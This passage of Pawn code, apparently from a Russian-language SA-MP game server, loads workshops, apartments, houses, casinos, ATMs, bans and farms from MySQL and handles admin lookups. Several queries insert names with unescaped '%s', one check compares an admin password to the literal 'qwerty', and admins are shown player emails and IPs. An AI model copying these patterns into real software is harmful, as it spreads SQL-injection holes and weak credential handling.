				WorkshopInfo[x][wExit][2] = 	cache_get_row_float(x-1,7, DATABASE);
				WorkshopInfo[x][wMenu][0] = 	cache_get_row_float(x-1,8, DATABASE);
				WorkshopInfo[x][wMenu][1] = 	cache_get_row_float(x-1,9, DATABASE);
				WorkshopInfo[x][wMenu][2] = 	cache_get_row_float(x-1,10, DATABASE);
				WorkshopInfo[x][wBank] = 		cache_get_row_int(x-1,11, DATABASE);
				WorkshopInfo[x][wLandTax] = 	cache_get_row_int(x-1,12, DATABASE);
				WorkshopInfo[x][wProds] = 		cache_get_row_int(x-1,13, DATABASE);
				WorkshopInfo[x][wPriceProds] = 	cache_get_row_int(x-1,14, DATABASE);
				WorkshopInfo[x][wZp] = 			cache_get_row_int(x-1,15, DATABASE);
				cache_get_row(x-1, 16, 			WorkshopInfo[x][wDeputy1], DATABASE, 32);
				cache_get_row(x-1, 17, 			WorkshopInfo[x][wDeputy2], DATABASE, 32);
				cache_get_row(x-1, 18, 			WorkshopInfo[x][wDeputy3], DATABASE, 32);
				cache_get_row(x-1, 19, 			WorkshopInfo[x][wMechanic1], DATABASE, 32);
				cache_get_row(x-1, 20, 			WorkshopInfo[x][wMechanic2], DATABASE, 32);
				cache_get_row(x-1, 21, 			WorkshopInfo[x][wMechanic3], DATABASE, 32);
				cache_get_row(x-1, 22, 			WorkshopInfo[x][wMechanic4], DATABASE, 32);
				cache_get_row(x-1, 23, 			WorkshopInfo[x][wMechanic5], DATABASE, 32);
				cache_get_row(x-1, 24, 			WorkshopInfo[x][wAuctions], DATABASE, 128);
				sscanf(WorkshopInfo[x][wAuctions], "p<,>a<i>[5]",WorkshopInfo[x][wAuction]);
				cache_get_row(x-1, 25, 			WorkshopInfo[x][wAuctionName], DATABASE, MAX_PLAYER_NAME);
				WorkshopInfo[x][wBiker] = 		cache_get_row_int(x-1,26, DATABASE);
				WorkshopInfo[x][wPickup][0] = CreatePickupAC(1318, 23, WorkshopInfo[x][wEntr][0], WorkshopInfo[x][wEntr][1], WorkshopInfo[x][wEntr][2]);
				WorkshopInfo[x][wPickup][1] = CreatePickupAC(1318, 23, WorkshopInfo[x][wExit][0], WorkshopInfo[x][wExit][1], WorkshopInfo[x][wExit][2],x);
				WorkshopInfo[x][wPickup][2] = CreatePickupAC(1275, 23, 1496.0302,1308.6653,1093.2892,x);
				WorkshopInfo[x][wPickup][3] = CreatePickupAC(1239, 23, 1492.7340,1308.1758,1093.2927,x);
				format(YCMDstr, 160, "Автомастерская ID: {FFFFFF}%i\n{DDB201}Информация: {FFFFFF}/tinfo",x-1);
				WorkshopInfo[x][wLabel] = CreateDynamic3DTextLabel(YCMDstr, 0xDDB201FF,WorkshopInfo[x][wEntr][0], WorkshopInfo[x][wEntr][1], WorkshopInfo[x][wEntr][2]+1,20.0);
				CreateDynamicMapIcon(WorkshopInfo[x][wEntr][0], WorkshopInfo[x][wEntr][1], WorkshopInfo[x][wEntr][2],27,0);

				TOTALSHOPS++;
			}
			for(new x_ = 9; x_ >= 0; x_--)
			{
				WorkshopList[x_][x][wlID] = -1;
				strmid(WorkshopList[x_][x][wlName],"", 0, strlen(""), 5);
			}
			printf("[Загрузка ...] Данные из Workshop получены! (%i шт.)",TOTALSHOPS);
		}
	case 8:
		{
			if(!r) return printf("[Загрузка ...] Данные из Kvart не получены!");
			for(x = 1; x <= r; x++)
			{
				kvartinfo[x][kid] = 			cache_get_row_int(x-1,0, DATABASE);
				kvartinfo[x][pXpic] = 			cache_get_row_float(x-1,1, DATABASE);
				kvartinfo[x][pYpic] = 			cache_get_row_float(x-1,2, DATABASE);
				kvartinfo[x][pZpic] = 			cache_get_row_float(x-1,3, DATABASE);
				cache_get_row(x-1, 4, 			kvartinfo[x][vladelec], DATABASE, 32);
				kvartinfo[x][lock] = 			cache_get_row_int(x-1,5, DATABASE);
				kvartinfo[x][aptek] = 			cache_get_row_int(x-1,6, DATABASE);
				kvartinfo[x][plata] = 			cache_get_row_int(x-1,7, DATABASE);
				kvartinfo[x][kCena] = 			cache_get_row_int(x-1,8, DATABASE);
				kvartinfo[x][kInt] = 			cache_get_row_int(x-1,9, DATABASE);
				kvartinfo[x][virtmir] = 		cache_get_row_int(x-1,10, DATABASE);
				kvartinfo[x][kworld] = 			cache_get_row_int(x-1,11, DATABASE);
				if(!strcmp(kvartinfo[x][vladelec],"None",true))
				{
					switch(booston)
					{
					case 0:format(QUERY, sizeof(QUERY),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",x,kvartinfo[x][kCena]);
					case 1:format(QUERY, sizeof(QUERY),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",x,kvartinfo[x][kCena]-kvartinfo[x][kCena]*40/100);
					}
				}
				else format(QUERY, 180,"{FFBF00}Квартира #%i\nВладелец: %s\nЧтобы войти, нажмите клавишу 'ENTER'",x, kvartinfo[x][vladelec]);
				kvartinfo[x][dtext]     =    CreateDynamic3DTextLabel(QUERY,0x0076FCFF,kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,kvartinfo[x][kworld]);
				CreateDynamic3DTextLabel("Чтобы выйти, нажмите клавишу '~k~~VEHICLE_ENTER_EXIT~'\nКупить/продать, нажмите клавишу ~k~~SNEAK_ABOUT~",0x0076FCFF,2282.9211,-1140.2861,1050.8984+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,x);
				CreateDynamic3DTextLabel("Чтобы выйти, нажмите клавишу '~k~~VEHICLE_ENTER_EXIT~'\nКупить/продать, нажмите клавишу ~k~~SNEAK_ABOUT~",0x0076FCFF,54.8790,-79.7394,1004.2859+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,x);
				CreateDynamic3DTextLabel("Чтобы выйти, нажмите клавишу '~k~~VEHICLE_ENTER_EXIT~'\nКупить/продать, нажмите клавишу ~k~~SNEAK_ABOUT~",0x0076FCFF,34.9120,-81.2602,1004.2859+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,x);
				ALLKVARTIRI++;
				updatekvar(x);
			}
			printf("[Загрузка ...] Данные из Kvart получены! (%i шт.)",ALLKVARTIRI);
		}
	case 9:
		{
			if(!r) return printf("[Загрузка ...] Данные из Podeezd не получены!");
			for(x = 1; x <= r; x++)
			{
				AllPODEZD++;
				PodeezdInfo[x][pid] = 			cache_get_row_int(x-1,0, DATABASE);
				PodeezdInfo[x][podPicX] = 		cache_get_row_float(x-1,1, DATABASE);
				PodeezdInfo[x][podPicY] = 		cache_get_row_float(x-1,2, DATABASE);
				PodeezdInfo[x][podPicZ] = 		cache_get_row_float(x-1,3, DATABASE);
				PodeezdInfo[x][podEtazi] = 		cache_get_row_int(x-1,4, DATABASE);
				PodeezdInfo[x][carX] = 			cache_get_row_float(x-1,5, DATABASE);
				PodeezdInfo[x][carY] = 			cache_get_row_float(x-1,6, DATABASE);
				PodeezdInfo[x][carZ] = 			cache_get_row_float(x-1,7, DATABASE);
				PodeezdInfo[x][podInt] = 		cache_get_row_int(x-1,8, DATABASE);
				PodeezdInfo[x][carC] = 			cache_get_row_float(x-1,9, DATABASE);

				format(QUERY, 123,"Многоквартирный дом\nНомер подъезда: %i",AllPODEZD);
				CreateDynamic3DTextLabel(QUERY,0x0076FCFF,PodeezdInfo[x][podPicX],PodeezdInfo[x][podPicY],PodeezdInfo[x][podPicZ]+1,5.0);
				PodeezdInfo[x][podPic]    =    CreatePickupAC(1318, 1, PodeezdInfo[x][podPicX], PodeezdInfo[x][podPicY], PodeezdInfo[x][podPicZ]);
				for(new b = 1; b <= PodeezdInfo[x][podEtazi]; b++)
				{
					ALLPODEZD++;
					PodeezdInfo[x][podMir][b]   =   ALLPODEZD;
					//printf("%d",ALLPODEZD);
				}
				ALLPODEZD = 0;
			}
			printf("[Загрузка ...] Данные из Podeezd получены! (%i шт.)",AllPODEZD);
		}
	case 10:
		{
			if(!r) return printf("[Загрузка ...] Данные из Casino не получены!");
			for(x = 1; x <= r; x++)
			{
				CasinoInfo[x][caID] = 			cache_get_row_int(x-1,0, DATABASE);
				cache_get_row(x-1, 1, 			CasinoInfo[x][caName], DATABASE, 32);
				CasinoInfo[x][caMafia] = 		cache_get_row_int(x-1,2, DATABASE);
				cache_get_row(x-1, 3, 			CasinoInfo[x][caKrupie], DATABASE, 32);
				cache_get_row(x-1, 4, 			CasinoInfo[x][caKrupie2], DATABASE, 32);
				cache_get_row(x-1, 5, 			CasinoInfo[x][caKrupie3], DATABASE, 32);
				cache_get_row(x-1, 6, 			CasinoInfo[x][caKrupie4], DATABASE, 32);
				cache_get_row(x-1, 7, 			CasinoInfo[x][caKrupie5], DATABASE, 32);
				cache_get_row(x-1, 8, 			CasinoInfo[x][caKrupie6], DATABASE, 32);
				cache_get_row(x-1, 9, 			CasinoInfo[x][caKrupie7], DATABASE, 32);
				cache_get_row(x-1, 10, 			CasinoInfo[x][caKrupie8], DATABASE, 32);
				cache_get_row(x-1, 11, 			CasinoInfo[x][caKrupie9], DATABASE, 32);
				cache_get_row(x-1, 12, 			CasinoInfo[x][caKrupie10], DATABASE, 32);
				cache_get_row(x-1, 13, 			CasinoInfo[x][caManager], DATABASE, 32);
				cache_get_row(x-1, 14, 			CasinoInfo[x][caManager2], DATABASE, 32);
				cache_get_row(x-1, 15, 			CasinoInfo[x][caManager3], DATABASE, 32);
				CasinoInfo[x][caPos][0] = 		cache_get_row_int(x-1,16, DATABASE);
				CasinoInfo[x][caPos][1] = 		cache_get_row_int(x-1,17, DATABASE);
				CasinoInfo[x][caPos][2] = 		cache_get_row_int(x-1,18, DATABASE);
				TOTALCASINO++;
			}
			printf("[Загрузка ...] Данные из Casino получены! (%i шт.)",TOTALCASINO);
		}
	case 11:
		{
			if(!r) return printf("[Загрузка ...] Данные из House не получены!");
			for(x = 1; x <= r; x++)
			{
				HouseInfo[x][hID] =             cache_get_row_int(x-1,0, DATABASE);
				HouseInfo[x][hEntrancex] =      cache_get_row_float(x-1,1, DATABASE);
				HouseInfo[x][hEntrancey] =      cache_get_row_float(x-1,2, DATABASE);
				HouseInfo[x][hEntrancez] =      cache_get_row_float(x-1,3, DATABASE);
				HouseInfo[x][hExitx] =          cache_get_row_float(x-1,4, DATABASE);
				HouseInfo[x][hExity] =          cache_get_row_float(x-1,5, DATABASE);
				HouseInfo[x][hExitz] =          cache_get_row_float(x-1,6, DATABASE);
				HouseInfo[x][hCarx] =           cache_get_row_float(x-1,7, DATABASE);
				HouseInfo[x][hCary] =           cache_get_row_float(x-1,8, DATABASE);
				HouseInfo[x][hCarz] =           cache_get_row_float(x-1,9, DATABASE);
				HouseInfo[x][hCarc] =           cache_get_row_float(x-1,10, DATABASE);
				cache_get_row(x-1, 11, 			HouseInfo[x][hOwner], DATABASE, MAX_PLAYER_NAME);
				HouseInfo[x][hValue] =          cache_get_row_int(x-1,12, DATABASE);
				HouseInfo[x][hHel] =            cache_get_row_int(x-1,13, DATABASE);
				HouseInfo[x][hInt] =            cache_get_row_int(x-1,14, DATABASE);
				HouseInfo[x][hLock] =           cache_get_row_int(x-1,15, DATABASE);
				HouseInfo[x][hTakings] =        cache_get_row_int(x-1,16, DATABASE);
				HouseInfo[x][hDate] =           cache_get_row_int(x-1,17, DATABASE);
				HouseInfo[x][hKlass] =          cache_get_row_int(x-1,18, DATABASE);
				HouseInfo[x][hVec] =            cache_get_row_int(x-1,19, DATABASE);
				HouseInfo[x][hVcol1] =          cache_get_row_int(x-1,20, DATABASE);
				HouseInfo[x][hVcol2] =          cache_get_row_int(x-1,21, DATABASE);
				HouseInfo[x][hVehSost] =        cache_get_row_int(x-1,22, DATABASE);
				cache_get_row(x-1, 34, HouseInfo[x][hSafes], DATABASE, 64);
				sscanf(HouseInfo[x][hSafes], "p<,>a<i>[11]",HouseInfo[x][hSafe]);
				if(strcmp(HouseInfo[x][hOwner],"None",true) == 0)
				{
					HouseInfo[x][hPickup] = CreatePickupAC(1273, 23, HouseInfo[x][hEntrancex], HouseInfo[x][hEntrancey], HouseInfo[x][hEntrancez],-1);
					HouseInfo[x][hMIcon] = CreateDynamicMapIcon(HouseInfo[x][hEntrancex], HouseInfo[x][hEntrancey], HouseInfo[x][hEntrancez], 31, -1, 0, -1, -1,150);
				}
				else
				{
					HouseInfo[x][hPickup] = CreatePickupAC(1272, 23, HouseInfo[x][hEntrancex], HouseInfo[x][hEntrancey], HouseInfo[x][hEntrancez],-1);
					HouseInfo[x][hMIcon] = CreateDynamicMapIcon(HouseInfo[x][hEntrancex], HouseInfo[x][hEntrancey], HouseInfo[x][hEntrancez], 32, -1, 0, -1, -1,150);
				}
				HouseInfo[x][hExitText] = CreateDynamic3DTextLabel("Чтобы выйти, нажмите клавишу '~k~~VEHICLE_ENTER_EXIT~'\nКупить/продать, нажмите клавишу '~k~~SNEAK_ABOUT~'",0x0076FCFF,HouseInfo[x][hExitx],HouseInfo[x][hExity],HouseInfo[x][hExitz]+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,x+50);
				TotalHouse++;
			}
			printf("[Загрузка ...] Данные из House получены! (%i шт.)",TotalHouse);
		}
	case 12:
		{
			BizzInfo[playerid][bLocked] = 0;
			BizzInfo[playerid][bPrice] = 100;
			BizzInfo[playerid][bTill] = 0;
			BizzInfo[playerid][bLandTax] = BizzLandTax[playerid]*12;
			BizzPay[playerid] = 0;
			BizzInfo[playerid][bLicense] = 0;
			BizzInfo[playerid][bStavka] = 0;
			BizzInfo[playerid][bMinStavka] = 0;
			BizzInfo[playerid][bTimeStavka] = 0;
			BizzInfo[playerid][bLastStavka] = 0;
			BizzInfo[playerid][bLockTime] = 0;
			BizzInfo[playerid][bEntranceCost] = 100;
			strmid(BizzInfo[playerid][bOwner],BizzInfo[playerid][bNameStavka], 0, strlen(BizzInfo[playerid][bNameStavka]), 32);
			if(IsPlayerConnected(GetPlayerID(BizzInfo[playerid][bNameStavka]))) BGet(GetPlayerID(BizzInfo[playerid][bNameStavka])), SCM(GetPlayerID(BizzInfo[playerid][bNameStavka]),COLOR_GREEN," Вы приобрели бизнес с аукциона. (( Управление: /mm > Команды сервера ))");
			strmid(BizzInfo[playerid][bNameStavka], "-", 0, strlen("-"), 10);
			UpdateBizz(playerid);
		}
	case 13:
		{
			new Nick[50];
			if(!r) return printf("[Получение денег за друга ...] Аккаунт не найден!");
			cache_get_field_content(0,"pDrug",Nick,DATABASE,50);
			mysql_format(DATABASE,QUERY,256, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = pCash + 100000, pText = '3' WHERE name = '%s'",Nick);
			mysql_function_query(DATABASE,QUERY,false,"","");
			printf("Игроку %s выданы денег за реферала",Nick);
		}
	case 14:
		{
			new query[50], level;
			cache_get_field_content(0,"password",query,DATABASE,50);
			SetPVarString(playerid,"password",query);
			level =	cache_get_field_content_int(0,"level");
			SetPVarInt(playerid,"level",level);
			if(!r) return true;
			if(!strcmp(query, "qwerty", true))
			{
				SetPVarInt(playerid, "Alogin", 1);
                ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
			    Примечание:\n\
			    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
			    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
			}
			else
			{
				SetPVarInt(playerid, "Alogin", 2);
			    ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
			    Примечание:\n\
			    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
			    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
			}
		}
	case 16:
		{
			new minags[128];
			if(!r) return SCM(playerid, COLOR_GREY, " Аккаунт не найден!");
			new level,exp,viprank,warn,number,money,bank, leader,member,rank,job,jobskin,house,bizz,farm,pvip[16],don[128],ipk[16],regip[16],refer[24];
			level=cache_get_field_content_int(0,"pLevel");
			exp=cache_get_field_content_int(0,"pExp");
			viprank=cache_get_field_content_int(0,"pDonateRank");
			warn=cache_get_field_content_int(0,"pWarns");
			number=cache_get_field_content_int(0,"pPnumber");
			money=cache_get_field_content_int(0,"pCash");
			bank=cache_get_field_content_int(0,"pBank");
			leader=cache_get_field_content_int(0,"pLeader");
			member=cache_get_field_content_int(0,"pMember");
			rank=cache_get_field_content_int(0,"pRank");
			job=cache_get_field_content_int(0,"pJob");
			jobskin=cache_get_field_content_int(0,"pModel");
			house=cache_get_field_content_int(0,"pPHouseKey");
			bizz=cache_get_field_content_int(0,"pPBizzKey");
			farm=cache_get_field_content_int(0,"pPFarmKey");
			cache_get_field_content(0,"pvIp",pvip,DATABASE,16);
			cache_get_field_content(0,"pEmail",don,DATABASE,128);
			cache_get_field_content(0,"pIpReg",regip,DATABASE,16);
			cache_get_field_content(0,"pDrug",refer,DATABASE,24);
			QUERY="\n";
			format(minags,sizeof(minags),"Name:      \t\t%s\n\nLevel:      \t\t%i\nExp:      \t\t%i\n",str,level,exp); strcat(QUERY,minags);
			format(minags,sizeof(minags),"Vip:      \t\t\t%i\nWarns:      \t\t%i\nPhone:      \t\t%i\n",viprank,warn,number); strcat(QUERY,minags);
			format(minags,sizeof(minags),"Money:      \t\t%i\nBank:      \t\t%i\nLeader:      \t\t%i\n",money,bank,leader); strcat(QUERY,minags);
			format(minags,sizeof(minags),"Member:      \t\t%i\nRank:      \t\t%i\nJob:      \t\t%i\n",member,rank,job); strcat(QUERY,minags);
			format(minags,sizeof(minags),"JobSkin:      \t\t%i\nHouse:      \t\t%i\n",jobskin,house); strcat(QUERY,minags);
			format(minags,sizeof(minags),"Biz:      \t\t%i\nFarm:      \t\t%i\nEmail:      \t\t%s\nsuperKeyIP:      \t%s\n",bizz,farm,don,pvip); strcat(QUERY,minags);
			format(minags,sizeof(minags),"L-IP:      \t\t%s\nR-IP:      \t\t%s\nRefer:      \t\t%s\n\n",ipk,regip,refer); strcat(QUERY,minags);
			strcat(QUERY,"\n{FF6347}* superKeyIP - к которому привязан акк\nЕсли superKeyIP и L-IP не равны,\nто кто-то пытался войти в аккаунт,\nнезная супер ключа");
			ShowPlayerDialogEx(playerid,22815,DIALOG_STYLE_MSGBOX,"OFFLINE Статистика персонажа",QUERY,"Готово","");
			printf("Администратор %s смотрит статистику %s",Name(playerid), str);
		}
	case 17:
		{
			if(r)
			{
			    
				if(playerid == 0)
				{
					mysql_format(DATABASE,QUERY, 128, "DELETE FROM "TABLE_ADMIN" WHERE `Name`= '%s'", str);
					mysql_function_query(DATABASE,QUERY,false,"","");
					if(IsPlayerConnected(GetPlayerID(str))) PlayerInfo[GetPlayerID(str)][pAdmin] = 0;
				}
				else
				{
					mysql_format(DATABASE,QUERY,256, "UPDATE "TABLE_ADMIN" SET  level = '%i' WHERE Name = '%s' LIMIT 1",playerid,str);
					mysql_function_query(DATABASE,QUERY,false,"","");
				}
			}
			else
			{
			    if(playerid > 0)
			    {
					new year, month,day;
					getdate(year, month, day);
					mysql_format(DATABASE,QUERY, 512, "INSERT INTO "TABLE_ADMIN" (Name, level, LastCon) VALUES ('%s', %i, '%02i.%02i.%04i')",str, playerid,day,month,year);
					mysql_function_query(DATABASE,QUERY,false,"","");
				}
			}
		}
	case 18:
		{
			if(!r) return SCM(playerid,COLOR_GREY," Аккаунт не найден!");
			cache_get_field_content(0,"pOnline",QUERY,DATABASE,30);
			SendMes(playerid,COLOR_BLUE," Ник: %s | Последний вход: %s",str,QUERY);
		}
	case 19:
		{
			if(!r) return SCM(playerid,COLOR_GREY," Не найдено совпадений!");
			for new i=0;i<r;i++ do
			{
				cache_get_field_content(i,"Name",QUERY,DATABASE,MAX_PLAYER_NAME);
				SendMes(playerid,COLOR_BLUE," Ник: %s | Фракция ID: %i",QUERY,strval(str));
			}
		}
	case 20:
		{
			if(!r) return SCM(playerid,COLOR_GREY," Произошла ошибка. Возможно неверно указан ник");
			new ip[32], ipreg[32], pvip[32];
			cache_get_field_content(0,"pIp",ip,DATABASE,30);
			cache_get_field_content(0,"pIpReg",ipreg,DATABASE,30);
			cache_get_field_content(0,"pvIp",pvip,DATABASE,30);
			SendMes(playerid,COLOR_BLUE," Nik [%s]   Register-IP [%s]   Last-IP [%s]",str,ipreg,pvip);
		}
	case 22:
		{
			if(!r) return printf("[Загрузка ...] Данные из Atm не получены!");
			for(x = 1; x <= r; x++)
			{
				ATMInfo[x][aid] = cache_get_row_int(x-1,0, DATABASE);
				ATMInfo[x][aX] = cache_get_row_float(x-1,1, DATABASE);
				ATMInfo[x][aY] = cache_get_row_float(x-1,2, DATABASE);
				ATMInfo[x][aZ] = cache_get_row_float(x-1,3, DATABASE);
				ATMInfo[x][arZ] = cache_get_row_float(x-1,4, DATABASE);
				ATM[x] = CreateDynamicObject(2754, ATMInfo[x][aX], ATMInfo[x][aY], ATMInfo[x][aZ], 0.0, 0.0, ATMInfo[x][arZ]);
				SetDynamicObjectMaterial(ATM[x], 0, 18646, "matcolours", "grey-40-percent", 0);
				SetDynamicObjectMaterial(ATM[x], 6, 10626, "queens2_sfs", "ws_awning_plum", 0);
				SetDynamicObjectMaterial(ATM[x], 5, 10626, "queens2_sfs", "ws_awning_plum", 0);
				SetDynamicObjectMaterial(ATM[x], 4, 16640, "a51", "a51_monitors", 0);
				SetDynamicObjectMaterial(ATM[x], 2, 4551, "sunset1_lan2", "snpedpurtrm", 0);
				SetDynamicObjectMaterial(ATM[x], 1, 1376, "cranes_dyn2_cj", "ws_oldpaintedblue", 0);
				SetDynamicObjectMaterial(ATM[x], 0, 6336, "sunset02_law2", "bank01_LAw", 0);
				LABELATM[x] = CreateDynamic3DTextLabel("Нажмите: 'ENTER'",0x00D900FF, ATMInfo[x][aX],ATMInfo[x][aY],ATMInfo[x][aZ]+1.1,10.0);
				TOTALATM++;
			}
			printf("[Загрузка ...] Данные из Atm получены! (%i шт.)",TOTALATM);
		}
	case 23:
		{
			if(!r) return printf("[Аукцион СТО/Ферм] Нет аккаунта. Деньги не были зачислены!");
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = pBank + %i WHERE Name = '%e'",WorkshopInfo[bizselect[playerid]][wAuction][1],WorkshopInfo[bizselect[playerid]][wAuctionName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			printf("Игроку %s были зачислены %i вирт за аукцтон СТО/Ферм",WorkshopInfo[bizselect[playerid]][wAuctionName], WorkshopInfo[bizselect[playerid]][wAuction][1]);
		}
	case 24:
		{
			new day, month, year;
			gettime(day,month,year);
			if(IsPlayerConnected(GetPlayerID(WorkshopInfo[playerid][wAuctionName]))) SCM(GetPlayerID(WorkshopInfo[playerid][wAuctionName]),-1," Вы приобрели СТО/Ферму с аукциона!");
			strmid(WorkshopInfo[playerid][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[playerid][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[playerid][wLandTax] = 6000;
			WorkshopInfo[playerid][wBank] = (WorkshopInfo[playerid][wAuction][0]/100)*20;
			WorkshopInfo[playerid][wProds] = 20000;
			WorkshopInfo[playerid][wPriceProds] = 50;
			WorkshopInfo[playerid][wZp] = 5;
			strmid(WorkshopInfo[playerid][wOwner],WorkshopInfo[playerid][wAuctionName], 0, strlen(WorkshopInfo[playerid][wAuctionName]), MAX_PLAYER_NAME);
			if(IsPlayerConnected(GetPlayerID(WorkshopInfo[playerid][wAuctionName]))) WGet(GetPlayerID(WorkshopInfo[playerid][wAuctionName]));
			strmid(WorkshopInfo[playerid][wAuctionName], "None", 0, strlen("None"), 10);
			WorkshopInfo[playerid][wAuction][0] = 0;
			WorkshopInfo[playerid][wAuction][1] = 0;
			WorkshopInfo[playerid][wAuction][2] = 0;
			WorkshopInfo[playerid][wAuction][3] = 0;
			WorkshopInfo[playerid][wAuction][4] = mktimes(0,0,0,day+14,month,year);
		}
	case 25:
		{
			if(r)
			{
				new ban = cache_get_field_content_int(0,"Unban");
				new ddate = cache_get_field_content_int(0,"Date");
				new nameadmin[32], banreason[32];
				cache_get_field_content(0,"NameAdmin", nameadmin);
				cache_get_field_content(0,"Reason", banreason);
				new year, month, day,hour,minute,second;
				new byear, bmonth, bday,bhour,bminute,bsecond;
				TimestampToDates(ban, year, month, day, hour, minute, second, 0);
				TimestampToDates(ddate, byear, bmonth, bday, bhour, bminute, bsecond, 0);
				format(YCMDstr, sizeof(YCMDstr), "{D95A41}Этот аккаунт заблокирован\nЗабанил: %s\nПричина: %s\nДата бана: %i/%02i/%02i %02i:%02i:%02i\nДата разбана: %i/%02i/%02i %02i:%02i:%02i\n\nВведите \"/q\" чтобы выйти\n",nameadmin, banreason, byear,bmonth,bday,bhour,bminute,bsecond, year,month,day,hour,minute,second);
				ShowPlayerDialogEx(playerid,78,0,"{c22000}Внимание",YCMDstr,"Закрыть","");
				return Kick(playerid);
			}
			mysql_format(DATABASE,QUERY,sizeof(QUERY),"SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s' AND `pKey`= '%s'",PlayerInfo[playerid][pName],PlayerInfo[playerid][pKey]);
			mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",2,playerid,"");
		}
	case 26:
		{
			new null[2] = 0;
			if(r)
			{
				for(x = 1; x <= r; x++)
				{
					new unban = cache_get_row_int(x-1,5, DATABASE);
					cache_get_field_content(x-1,"Name",QUERY,DATABASE,MAX_PLAYER_NAME);
					if(unban < Now())
					{
						mysql_format(DATABASE,QUERY,128, "DELETE FROM `"TABLE_BAN"` WHERE `Name` = '%e'",QUERY);
						mysql_function_query(DATABASE,QUERY,false,"","");
						null[0]++;
					}
					null[1]++;
				}
			}
			printf("[Загрузка ...] Забаненых аккаунтов %i. Разбанено %i аккаунтов",null[1],null[0]);
		}
	case 28:
		{
			if(!r) return printf("[Загрузка ...] Данные из Farms не получены!");
			for(x = 1; x <= r; x++)
			{
				FarmInfo[x][fID] = 				cache_get_row_int(x-1,0, DATABASE);
				cache_get_row(x-1, 1, 			FarmInfo[x][fOwner], DATABASE, MAX_PLAYER_NAME);
				FarmInfo[x][fMenu][0] = 		cache_get_row_float(x-1,2, DATABASE);
				FarmInfo[x][fMenu][1] = 		cache_get_row_float(x-1,3, DATABASE);
				FarmInfo[x][fMenu][2] = 		cache_get_row_float(x-1,4, DATABASE);
				FarmInfo[x][fCloakroom][0] = 	cache_get_row_float(x-1,5, DATABASE);
				FarmInfo[x][fCloakroom][1] = 	cache_get_row_float(x-1,6, DATABASE);
				FarmInfo[x][fCloakroom][2] = 	cache_get_row_float(x-1,7, DATABASE);
				FarmInfo[x][fBank] = 			cache_get_row_int(x-1,8, DATABASE);
				FarmInfo[x][fLandTax] = 		cache_get_row_int(x-1,9, DATABASE);
				FarmInfo[x][fZp] = 				cache_get_row_int(x-1,10, DATABASE);
				FarmInfo[x][fGrain_Price] = 	cache_get_row_int(x-1,11, DATABASE);
				FarmInfo[x][fGrain] = 			cache_get_row_int(x-1,12, DATABASE);
				FarmInfo[x][fGrain_Sown] = 		cache_get_row_int(x-1,13, DATABASE);
				FarmInfo[x][fProds_Selling] = 	cache_get_row_int(x-1,14, DATABASE);
				FarmInfo[x][fProds] = 			cache_get_row_int(x-1,15, DATABASE);
				FarmInfo[x][fProds_Price] = 	cache_get_row_int(x-1,16, DATABASE);
				cache_get_row(x-1, 17, 			FarmInfo[x][fDeputy_1], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 18, 			FarmInfo[x][fDeputy_2], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 19, 			FarmInfo[x][fDeputy_3], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 20, 			FarmInfo[x][fFarmer_1], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 21, 			FarmInfo[x][fFarmer_2], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 22, 			FarmInfo[x][fFarmer_3], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 23, 			FarmInfo[x][fFarmer_4], DATABASE, MAX_PLAYER_NAME);
				cache_get_row(x-1, 24, 			FarmInfo[x][fFarmer_5], DATABASE, MAX_PLAYER_NAME);

				cache_get_row(x-1, 25, 			FarmInfo[x][fAuctions], DATABASE, 128);
				sscanf(FarmInfo[x][fAuctions], "p<,>a<i>[5]",FarmInfo[x][fAuction]);
				cache_get_row(x-1, 26, 			FarmInfo[x][fAuctionName], DATABASE, MAX_PLAYER_NAME);
				FarmInfo[x][fBiker] =			cache_get_row_int(x-1, 27, DATABASE);
